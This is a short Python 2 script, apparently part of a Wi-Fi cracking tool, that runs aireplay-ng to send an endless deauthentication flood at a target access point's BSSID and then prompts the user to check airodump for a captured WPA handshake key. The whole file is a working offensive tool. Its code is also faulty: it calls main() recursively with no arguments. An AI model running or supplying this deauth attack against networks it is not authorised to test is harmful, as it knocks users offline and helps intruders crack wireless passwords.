#!/usr/bin/env python
# coding=UTF-8

import os
import socket
import operator
# #from termcolor import colored
import sys
from CrackHead_Targeted import *

def main(capture_BSSID, capture_Channel, airodump_capture_file, capture_Interface):
    # user_input = aireplay_Parameters.from_input()


    cmd_String = "aireplay-ng -0 0 -a {0} --ignore-negative-one {1}".format(capture_BSSID, capture_Interface)
    print 'Starting deauth attack loop'
    print cmd_String
    os.system(cmd_String)
    print 'Deauth packets complete, please check your terminal session containing Airodump, see that you captured the key on the top right corner'
    main()
    return
main(capture_BSSID, capture_Channel, airodump_capture_file, capture_Interface)
